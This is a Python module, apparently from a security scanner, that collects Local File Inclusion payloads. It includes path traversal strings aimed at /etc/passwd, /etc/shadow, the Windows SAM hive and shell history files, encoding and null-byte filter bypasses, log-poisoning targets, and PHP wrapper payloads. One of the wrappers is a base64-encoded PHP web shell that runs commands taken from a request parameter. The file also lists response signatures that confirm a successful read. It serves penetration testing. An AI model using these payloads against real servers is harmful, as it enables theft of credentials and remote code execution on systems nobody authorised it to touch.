"""
ReconScan LFI Payload Library

Comprehensive Local File Inclusion testing payloads from exploit databases.
Organized by operating system and bypass technique.
"""

class LFIPayloads:
    """Comprehensive LFI payload collection for vulnerability testing."""
    
    def __init__(self):
        """Initialize LFI payload sets."""
        
        # Basic Linux LFI payloads
        self.linux_basic_payloads = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            "/etc/passwd",
            "../../../../etc/shadow",
            "../../../../etc/hosts",
            "../../../../etc/hostname",
            "../../../../etc/resolv.conf",
            "../../../../proc/version",
            "../../../../proc/cmdline",
            "../../../../proc/meminfo",
            "../../../../proc/cpuinfo",
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/httpd/access_log"
        ]
        
        # Basic Windows LFI payloads
        self.windows_basic_payloads = [
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\boot.ini",
            "../../../../boot.ini",
            "..\\..\\..\\..\\windows\\win.ini",
            "../../../../windows/win.ini",
            "..\\..\\..\\..\\windows\\system.ini",
            "../../../../windows/system.ini",
            "C:\\windows\\system32\\drivers\\etc\\hosts",
            "C:\\boot.ini",
            "C:\\windows\\win.ini",
            "C:\\windows\\system.ini"
        ]
        
        # Null byte injection payloads (for older PHP versions)
        self.null_byte_payloads = [
            "../../../../etc/passwd%00",
            "../../../../etc/passwd%00.jpg",
            "../../../../etc/passwd%00.txt",
            "../../../../etc/passwd%00.php",
            "..\\..\\..\\..\\boot.ini%00",
            "..\\..\\..\\..\\boot.ini%00.jpg",
            "../../../../windows/win.ini%00",
            "/etc/passwd%00",
            "/etc/passwd%00.png"
        ]
        
        # URL encoding bypass payloads
        self.encoded_payloads = [
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fboot%2eini",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%5c..%5c..%5c..%5cboot.ini",
            "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "....//....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\....\\\\boot.ini"
        ]
        
        # Advanced traversal payloads
        self.advanced_payloads = [
            "....//....//....//....//etc/passwd",
            "....\\\\....\\\\....\\\\....\\\\boot.ini",
            "..;/..;/..;/..;/etc/passwd",
            "...\\/...\\/...\\/...\\/etc/passwd",
            "/...//...//...//.../etc/passwd",
            "/....\\/....\\/....\\/..../etc/passwd",
            "\\\\..\\\\..\\\\..\\\\..\\\\etc\\\\passwd",
            "/../../../etc/passwd",
            "\\..\\..\\..\\..\\etc\\passwd"
        ]
        
        # Log file inclusion payloads (useful for log poisoning)
        self.log_file_payloads = [
            "../../../../var/log/apache2/access.log",
            "../../../../var/log/apache2/error.log",
            "../../../../var/log/httpd/access_log",
            "../../../../var/log/httpd/error_log",
            "../../../../var/log/nginx/access.log",
            "../../../../var/log/nginx/error.log",
            "../../../../var/log/auth.log",
            "../../../../var/log/syslog",
            "../../../../var/log/messages",
            "../../../../var/log/secure",
            "../../../../proc/self/environ",
            "../../../../proc/self/fd/0",
            "../../../../proc/self/fd/1",
            "../../../../proc/self/fd/2"
        ]
        
        # Configuration file payloads
        self.config_file_payloads = [
            "../../../../etc/apache2/apache2.conf",
            "../../../../etc/httpd/conf/httpd.conf",
            "../../../../etc/nginx/nginx.conf",
            "../../../../etc/mysql/my.cnf",
            "../../../../etc/php.ini",
            "../../../../etc/ssh/sshd_config",
            "../../../../home/.bashrc",
            "../../../../home/.bash_history",
            "../../../../root/.bashrc",
            "../../../../root/.bash_history",
            "../../../../etc/fstab",
            "../../../../etc/crontab"
        ]
        
        # PHP wrapper payloads
        self.php_wrapper_payloads = [
            "php://filter/read=convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=../../../../etc/passwd",
            "php://filter/read=convert.base64-encode/resource=../../../etc/passwd",
            "php://input",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+",
            "expect://id",
            "zip://test.zip%23shell.php",
            "phar://test.phar/shell.php"
        ]
        
        # Sensitive files for different systems
        self.sensitive_files = {
            'linux': [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/hosts",
                "/etc/hostname",
                "/etc/issue",
                "/etc/group",
                "/etc/crontab",
                "/etc/fstab",
                "/etc/mtab",
                "/proc/version",
                "/proc/cmdline",
                "/proc/mounts",
                "/proc/net/arp",
                "/proc/net/route",
                "/proc/net/tcp",
                "/proc/net/udp",
                "/proc/self/environ",
                "/proc/self/cmdline"
            ],
            'windows': [
                "C:\\boot.ini",
                "C:\\windows\\win.ini",
                "C:\\windows\\system.ini",
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "C:\\windows\\system32\\config\\SAM",
                "C:\\windows\\system32\\config\\SYSTEM",
                "C:\\windows\\system32\\config\\SOFTWARE",
                "C:\\windows\\system32\\config\\SECURITY",
                "C:\\windows\\system32\\config\\DEFAULT"
            ]
        }
        
        # Indicators for successful LFI
        self.success_indicators = [
            'root:x:0:0:',       # Linux /etc/passwd
            '[boot loader]',      # Windows boot.ini
            'localhost',          # hosts file
            '# This file contains', # Common in config files
            'daemon:x:',          # Linux /etc/passwd daemon user
            '[fonts]',            # Windows win.ini
            'for 16-bit app support', # Windows win.ini
            'extensions=',        # Windows win.ini
            '[MCI Extensions]',   # Windows win.ini
            'version_compile_os', # MySQL config
            'Linux version',      # /proc/version
            'MemTotal:'          # /proc/meminfo
        ]
        
    def get_linux_payloads(self):
        """Get Linux-specific LFI payloads."""
        return self.linux_basic_payloads
    
    def get_windows_payloads(self):
        """Get Windows-specific LFI payloads."""
        return self.windows_basic_payloads
    
    def get_null_byte_payloads(self):
        """Get null byte injection payloads."""
        return self.null_byte_payloads
    
    def get_encoded_payloads(self):
        """Get URL encoded bypass payloads."""
        return self.encoded_payloads
    
    def get_advanced_payloads(self):
        """Get advanced traversal payloads."""
        return self.advanced_payloads
    
    def get_log_file_payloads(self):
        """Get log file inclusion payloads."""
        return self.log_file_payloads
    
    def get_config_file_payloads(self):
        """Get configuration file payloads."""
        return self.config_file_payloads
    
    def get_php_wrapper_payloads(self):
        """Get PHP wrapper payloads."""
        return self.php_wrapper_payloads
    
    def get_sensitive_files(self, os_type='linux'):
        """Get sensitive files for specific OS."""
        return self.sensitive_files.get(os_type.lower(), self.sensitive_files['linux'])
    
    def get_success_indicators(self):
        """Get indicators of successful LFI."""
        return self.success_indicators
    
    def get_all_payloads(self):
        """Get comprehensive list of all LFI payloads."""
        all_payloads = []
        all_payloads.extend(self.linux_basic_payloads)
        all_payloads.extend(self.windows_basic_payloads)
        all_payloads.extend(self.null_byte_payloads)
        all_payloads.extend(self.encoded_payloads)
        all_payloads.extend(self.advanced_payloads)
        all_payloads.extend(self.log_file_payloads)
        all_payloads.extend(self.config_file_payloads)
        all_payloads.extend(self.php_wrapper_payloads)
        
        return list(set(all_payloads))  # Remove duplicates
    
    def get_targeted_payloads(self, severity='medium', os_type='linux'):
        """Get payloads based on severity/depth of testing."""
        if severity == 'low':
            if os_type.lower() == 'windows':
                return self.windows_basic_payloads[:5]
            else:
                return self.linux_basic_payloads[:5]
        elif severity == 'medium':
            payloads = []
            if os_type.lower() == 'windows':
                payloads.extend(self.windows_basic_payloads)
                payloads.extend(self.encoded_payloads[:5])
            else:
                payloads.extend(self.linux_basic_payloads)
                payloads.extend(self.encoded_payloads[:5])
                payloads.extend(self.log_file_payloads[:5])
            return payloads
        elif severity == 'high':
            return self.get_all_payloads()
        else:
            return self.linux_basic_payloads[:5]
    
    @staticmethod
    def get_common_parameters():
        """Get common parameter names for LFI testing."""
        return [
            'file', 'page', 'include', 'inc', 'path', 'dir', 'action',
            'board', 'date', 'detail', 'download', 'prefix', 'category',
            'template', 'layout', 'skin', 'content', 'document', 'folder',
            'root', 'path', 'pg', 'style', 'doc', 'feed', 'filename',
            'filepath', 'p', 'loc', 'location', 'menu', 'meta', 'type'
        ] 